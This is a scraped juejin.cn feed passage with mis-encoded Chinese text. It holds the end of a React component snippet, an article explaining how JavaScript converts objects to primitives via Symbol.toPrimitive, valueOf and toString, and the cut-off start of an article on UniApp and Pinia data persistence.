              <span class="hljs-attr">justifyContent:</span> '<span class="hljs-attr">center</span>',
              <span class="hljs-attr">marginTop:</span> '<span class="hljs-attr">16px</span>',
            }}
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
              <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
              <span class="hljs-attr">size</span>=<span class="hljs-string">"large"</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleVerify(item.id)}
              style={{
                width: '80%',
                maxWidth: '300px',
              }}
            &gt;
              æ ¸å¯¹1111{index}
            <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JSä¸­å¯¹è±¡æ˜¯æ€ä¹ˆè¿ç®—çš„å‘¢]]></title>    <link>https://juejin.cn/post/7592789801708339241</link>    <guid>https://juejin.cn/post/7592789801708339241</guid>    <pubDate>2026-01-08T07:56:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708339241" data-draft-id="7592572266754195519" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JSä¸­å¯¹è±¡æ˜¯æ€ä¹ˆè¿ç®—çš„å‘¢"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-08T07:56:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æˆ‘çš„å†™æ³•æœ‰ç‚¹æ½®"/> <meta itemprop="url" content="https://juejin.cn/user/1643143620204234"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JSä¸­å¯¹è±¡æ˜¯æ€ä¹ˆè¿ç®—çš„å‘¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1643143620204234/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æˆ‘çš„å†™æ³•æœ‰ç‚¹æ½®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:56:31.000Z" title="Thu Jan 08 2026 07:56:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript å¯¹è±¡è½¬åŸºæœ¬ç±»å‹çš„éšå¼è§„åˆ™ï¼Œä¸€æ¬¡è®²æ¸…</h2>
<p>åœ¨ JavaScript ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä¸€äº›**â€œçœ‹èµ·æ¥ä¸åˆç†ï¼Œä½†å®é™…ä¸Šå®Œå…¨ç¬¦åˆè§„èŒƒâ€**çš„è¡Œä¸ºï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">{} + 1
<span class="hljs-section">[]</span> == 0
<span class="hljs-attr">obj</span> == <span class="hljs-number">1</span>
</code></pre>
<p>è¿™äº›ç°è±¡çš„èƒŒåï¼Œéƒ½ç»•ä¸å¼€ä¸€ä¸ªæ ¸å¿ƒæœºåˆ¶ï¼š</p>
<blockquote>
<p><strong>å¯¹è±¡åœ¨å‚ä¸è¿ç®—æˆ–æ¯”è¾ƒæ—¶ï¼Œå¿…é¡»å…ˆè¢«è½¬æ¢ä¸ºåŸºæœ¬ç±»å‹å€¼ï¼ˆPrimitiveï¼‰</strong></p>
</blockquote>
<p>è€Œè¿™ä¸ªè½¬æ¢è¿‡ç¨‹ï¼Œå¹¶ä¸æ˜¯éšæ„çš„ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸€ã€å¯¹è±¡å¦‚ä½•è¢«è½¬æ¢æˆåŸºæœ¬ç±»å‹ï¼Ÿ</h3>
<p>å½“ JavaScript éœ€è¦æŠŠä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆåŸºæœ¬ç±»å‹æ—¶ï¼Œä¼šæŒ‰<strong>å›ºå®šé¡ºåº</strong>å°è¯•è°ƒç”¨å¯¹è±¡ä¸Šçš„ä¸‰ä¸ªæ–¹æ³•ï¼š</p>
<ol>
<li><code>@@toPrimitive</code>ï¼ˆä¹Ÿå°±æ˜¯ <code>Symbol.toPrimitive</code>ï¼‰</li>
<li><code>valueOf</code></li>
<li><code>toString</code></li>
</ol>
<h4 data-id="heading-2">åŸºæœ¬æµç¨‹å¯ä»¥æ€»ç»“ä¸ºï¼š</h4>
<blockquote>
<p><strong>è°å…ˆè¿”å›â€œåŸºæœ¬ç±»å‹â€ï¼Œè°å°±èƒœå‡º</strong></p>
</blockquote>
<p>å¦‚æœæŸä¸ªæ–¹æ³•è¿”å›çš„ä¸æ˜¯åŸºæœ¬ç±»å‹ï¼ˆstring / number / boolean / symbol / bigint / null / undefinedï¼‰ï¼Œ<br/>
é‚£ä¹ˆ JS ä¼š<strong>å¿½ç•¥è¿™ä¸ªç»“æœï¼Œç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªæ–¹æ³•</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-3">äºŒã€å®Œæ•´çš„è½¬æ¢æ­¥éª¤ï¼ˆè§„èŒƒçº§ï¼‰</h3>
<p>å½“å¯¹è±¡éœ€è¦è¢«è½¬æ¢ä¸ºåŸºæœ¬ç±»å‹æ—¶ï¼ŒJavaScript ä¼šæŒ‰ä»¥ä¸‹é€»è¾‘æ‰§è¡Œï¼š</p>
<ol>
<li>
<p><strong>å¦‚æœå¯¹è±¡å­˜åœ¨ <code>Symbol.toPrimitive</code> æ–¹æ³•</strong></p>
<ul>
<li>è°ƒç”¨å®ƒ</li>
<li>å¦‚æœè¿”å›çš„æ˜¯åŸºæœ¬ç±»å‹ï¼Œç›´æ¥ä½¿ç”¨</li>
<li>å¦åˆ™æŠ›å‡º <code>TypeError</code></li>
</ul>
</li>
<li>
<p><strong>å¦åˆ™ï¼Œæ ¹æ®ç›®æ ‡ç±»å‹ï¼ˆPreferredTypeï¼‰å†³å®šè°ƒç”¨é¡ºåº</strong></p>
<ul>
<li>å…ˆå°è¯• <code>valueOf</code></li>
<li>å¦‚æœä¸æ˜¯åŸºæœ¬ç±»å‹ï¼Œå†å°è¯• <code>toString</code></li>
</ul>
</li>
<li>
<p><strong>å¦‚æœéƒ½æ²¡è¿”å›åŸºæœ¬ç±»å‹</strong></p>
<ul>
<li>æŠ›å‡º <code>TypeError</code></li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-4">ä¸‰ã€PreferredType æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>PreferredType å¯ä»¥ç†è§£ä¸ºï¼š</p>
<blockquote>
<p><strong>â€œå½“å‰ä¸Šä¸‹æ–‡æ›´å¸Œæœ›å¾—åˆ°ä»€ä¹ˆç±»å‹çš„å€¼â€</strong></p>
</blockquote>
<p>å®ƒç›´æ¥å½±å“ <code>valueOf</code> å’Œ <code>toString</code> çš„ä¼˜å…ˆçº§ã€‚</p>
<h4 data-id="heading-5">ä¸åŒåœºæ™¯ä¸‹çš„ PreferredType</h4>

























<table><thead><tr><th>åœºæ™¯</th><th>PreferredType</th><th>ä¼˜å…ˆé¡ºåº</th></tr></thead><tbody><tr><td>æ•°å­¦è¿ç®—ï¼ˆ<code>+ - * /</code>ï¼‰</td><td>Number</td><td>valueOf â†’ toString</td></tr><tr><td>æ˜¾å¼å­—ç¬¦ä¸²è½¬æ¢</td><td>String</td><td>toString â†’ valueOf</td></tr><tr><td><code>==</code> æ¯”è¾ƒ</td><td>Default</td><td>valueOf â†’ toString</td></tr></tbody></table>
<p>ğŸ“Œ <strong>æ³¨æ„</strong>ï¼šDefault å¹¶ä¸ç­‰äº Stringï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹å®ƒæ›´åå‘ Numberã€‚</p>
<hr/>
<h3 data-id="heading-6">å››ã€ä¸€ä¸ªå¯æ§é¡ºåºçš„ç¤ºä¾‹</h3>
<p>æ¥çœ‹ä¸€ä¸ªå…¸å‹ä¾‹å­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>

<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> i++
  },
  <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> i++
  },
  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toPrimitive</span>]() {
    <span class="hljs-keyword">return</span> i++
  }
}
</code></pre>
<h4 data-id="heading-7">åœºæ™¯ 1ï¼šéšå¼æ•°å€¼è½¬æ¢</h4>
<pre><code class="hljs">obj + 1
</code></pre>
<p>æ‰§è¡Œé¡ºåºï¼š</p>
<ol>
<li>è°ƒç”¨ <code>Symbol.toPrimitive</code></li>
<li>è¿”å› <code>0</code></li>
<li>è¡¨è¾¾å¼å˜æˆ <code>0 + 1</code></li>
</ol>
<p>ç»“æœæ˜¯ï¼š</p>
<pre><code class="hljs">1
</code></pre>
<hr/>
<h4 data-id="heading-8">åœºæ™¯ 2ï¼šåˆ é™¤ <code>Symbol.toPrimitive</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">delete</span> obj[<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toPrimitive</span>]
obj + <span class="hljs-number">1</span>
</code></pre>
<p>PreferredType æ˜¯ <code>Number</code>ï¼Œäºæ˜¯ï¼š</p>
<ol>
<li>è°ƒç”¨ <code>valueOf</code> â†’ è¿”å› <code>0</code></li>
<li>ä¸å†è°ƒç”¨ <code>toString</code></li>
</ol>
<hr/>
<h4 data-id="heading-9">åœºæ™¯ 3ï¼šå­—ç¬¦ä¸²ä¸Šä¸‹æ–‡</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">String</span>(obj)
</code></pre>
<p>PreferredType æ˜¯ <code>String</code>ï¼š</p>
<ol>
<li>å…ˆè°ƒç”¨ <code>toString</code></li>
<li>ä¸å…³å¿ƒ <code>valueOf</code></li>
</ol>
<hr/>
<h3 data-id="heading-10">äº”ã€å¯¹è±¡æ¯”è¾ƒæ—¶å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</h3>
<p>å½“ä½¿ç”¨ <code>==</code> è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå¦‚æœä¸¤ä¸ªæ“ä½œæ•°ç±»å‹ä¸åŒï¼ŒJS ä¼šå°è¯•è¿›è¡Œ<strong>ç±»å‹å¯¹é½</strong>ã€‚</p>
<h4 data-id="heading-11">æ ¸å¿ƒè§„åˆ™ä¹‹ä¸€ï¼š</h4>
<blockquote>
<p><strong>å¯¹è±¡åœ¨å‚ä¸ <code>==</code> æ¯”è¾ƒæ—¶ï¼Œä¸€å®šä¼šå…ˆè¢«è½¬æ¢ä¸ºåŸºæœ¬ç±»å‹</strong></p>
</blockquote>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">obj</span> == <span class="hljs-number">1</span>
</code></pre>
<p>å®é™…å‘ç”Ÿçš„æ˜¯ï¼š</p>
<ol>
<li><code>obj</code> â†’ è§¦å‘å¯¹è±¡è½¬åŸºæœ¬ç±»å‹</li>
<li>å¾—åˆ°ä¸€ä¸ª primitive</li>
<li>å†ä¸ <code>1</code> åšæ¯”è¾ƒ</li>
</ol>
<p>ğŸ“Œ æ‰€ä»¥å¾ˆå¤šâ€œå¥‡æ€ªçš„ç›¸ç­‰ç»“æœâ€ï¼Œæœ¬è´¨éƒ½æ˜¯<strong>éšå¼ç±»å‹è½¬æ¢çš„å‰¯ä½œç”¨</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-12">å…­ã€ä¸ºä»€ä¹ˆè®¾è®¡æˆè¿™æ ·ï¼Ÿ</h3>
<p>è¿™å¥—è§„åˆ™çš„ç›®æ ‡åªæœ‰ä¸€ä¸ªï¼š</p>
<blockquote>
<p><strong>è®©å¯¹è±¡åœ¨â€œå¿…é¡»å‚ä¸è¿ç®—â€çš„åœºæ™¯ä¸‹ï¼Œæœ‰æœºä¼šè¡¨è¾¾è‡ªå·±çš„å€¼è¯­ä¹‰</strong></p>
</blockquote>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>Date</code> æ›´åå‘å­—ç¬¦ä¸²</li>
<li><code>Number</code> åŒ…è£…å¯¹è±¡æ›´åå‘æ•°å€¼</li>
<li>è‡ªå®šä¹‰å¯¹è±¡å¯ä»¥é€šè¿‡ <code>Symbol.toPrimitive</code> ç²¾å‡†æ§åˆ¶è¡Œä¸º</li>
</ul>
<p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>() + <span class="hljs-number">1</span>
</code></pre>
<p>è¡¨ç°å¾—æ›´åƒå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè€Œä¸æ˜¯æ•°å­¦è¿ç®—ã€‚</p>
<hr/>
<h3 data-id="heading-13">ä¸ƒã€å®è·µå»ºè®®ï¼ˆéå¸¸é‡è¦ï¼‰</h3>
<h4 data-id="heading-14">âœ… èƒ½ä¸ç”¨éšå¼è½¬æ¢ï¼Œå°±ä¸ç”¨</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Number</span>(obj)
<span class="hljs-built_in">String</span>(obj)
</code></pre>
<h4 data-id="heading-15">âœ… è‡ªå®šä¹‰å¯¹è±¡æ—¶ï¼Œä¼˜å…ˆå®ç° <code>Symbol.toPrimitive</code></h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Symbol.toPrimitive]</span>(hint) {
  return <span class="hljs-attr">hint</span> === <span class="hljs-string">'string'</span> ? <span class="hljs-string">'xxx'</span> : <span class="hljs-number">123</span>
}
</code></pre>
<h4 data-id="heading-16">âŒ ä¸è¦ä¾èµ– <code>valueOf / toString</code> çš„â€œè°ƒç”¨é¡ºåºå‰¯ä½œç”¨â€</h4>
<p>é‚£æ˜¯ç»™è§„èŒƒå’Œå¼•æ“ç”¨çš„ï¼Œä¸æ˜¯ç»™ä¸šåŠ¡é€»è¾‘ç”¨çš„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UniApp + Pinia æ•°æ®æŒä¹…åŒ–]]></title>    <link>https://juejin.cn/post/7592555965792911366</link>    <guid>https://juejin.cn/post/7592555965792911366</guid>    <pubDate>2026-01-08T07:58:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592555965792911366" data-draft-id="7592789801708322857" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UniApp + Pinia æ•°æ®æŒä¹…åŒ–"/> <meta itemprop="keywords" content="å‰ç«¯,uni-app,æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-08T07:58:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€å£¶çº±"/> <meta itemprop="url" content="https://juejin.cn/user/897635786437944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UniApp + Pinia æ•°æ®æŒä¹…åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/897635786437944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€å£¶çº±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:58:25.000Z" title="Thu Jan 08 2026 07:58:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">UniApp + Pinia æ•°æ®æŒä¹…åŒ–ï¼šä¸€ä¸ªé«˜æ€§èƒ½çš„è¯»å†™åˆ†ç¦»æ–¹æ¡ˆ</h2>
<p>åœ¨ UniApp å¼€å‘ä¸­ï¼Œä½¿ç”¨ <strong>Pinia</strong> è¿›è¡ŒçŠ¶æ€ç®¡ç†å·²ç»éå¸¸æ™®åŠã€‚éšç€ App å¤æ‚åº¦å¢åŠ ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦æŠŠä¸€äº›å…³é”®æ•°æ®ï¼ˆå¦‚ Tokenã€ç”¨æˆ·ä¿¡æ¯ã€è®¾ç½®é¡¹ï¼‰å­˜å‚¨åœ¨æœ¬åœ°ï¼Œä»¥ä¾¿ä¸‹æ¬¡æ‰“å¼€ App æ—¶èƒ½ç›´æ¥æ¢å¤ã€‚</p>
<p>ä½†æ˜¯ï¼Œåœ¨ UniAppï¼ˆç‰¹åˆ«æ˜¯å°ç¨‹åºï¼‰ç¯å¢ƒä¸‹åšæŒä¹…åŒ–ï¼Œå¾€å¾€ä¼šé‡åˆ°å‡ ä¸ªæ£˜æ‰‹çš„é—®é¢˜ï¼š</p>
<ul>
